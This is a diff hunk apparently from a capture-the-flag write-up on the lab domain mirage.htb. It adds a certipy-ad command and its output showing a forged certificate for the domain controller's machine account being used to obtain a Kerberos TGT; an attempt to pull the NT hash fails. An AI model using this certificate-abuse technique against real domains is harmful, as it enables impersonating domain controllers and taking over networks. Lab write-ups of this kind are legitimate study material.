@@ -899,7 +899,24 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 Ill then use a TGT of `mark.bbond` to request a certificate for the DC$ machine account
 
+```python
+❯❯❯ faketime -f +7h certipy-ad auth -pfx 'dc.pfx' -dc-ip '10.129.232.163'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Certificate identities:
+[*]     SAN UPN: 'dc$@mirage.htb'
+[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
+[*] Using principal: 'dc$@mirage.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc.ccache'
+[*] Wrote credential cache to 'dc.ccache'
+[*] Trying to retrieve NT hash for 'dc$'
+[-] Failed to extract NT hash: Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Use -debug to print a stacktrace
+```
+
+Ill then attempt to get the NT hash of the DC machine account, but it fails, however i did get a TGT for th euse
 
 
 
